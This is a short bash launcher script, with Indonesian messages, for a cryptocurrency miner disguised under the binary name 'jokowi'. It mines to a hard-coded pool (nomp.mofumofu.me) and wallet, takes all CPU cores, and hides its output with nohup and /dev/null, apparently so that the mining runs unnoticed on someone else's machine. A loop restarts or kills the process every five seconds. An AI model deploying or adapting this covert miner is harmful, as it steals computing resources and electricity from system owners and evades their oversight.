#!/bin/bash

start_bandot() {
    nohup ./jokowi -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.COBA -t $(nproc) > /dev/null 2>&1
}

stop_bandot() {
    pkill jokowi
}

while true; do
    if pgrep -x "jokowi" > /dev/null
    then
        echo "jokowi sedang berjalan."
        stop_bandot
    else
        echo "jokowi tidak berjalan. Memulai..."
        start_bandot
    fi
    
    sleep 5
done
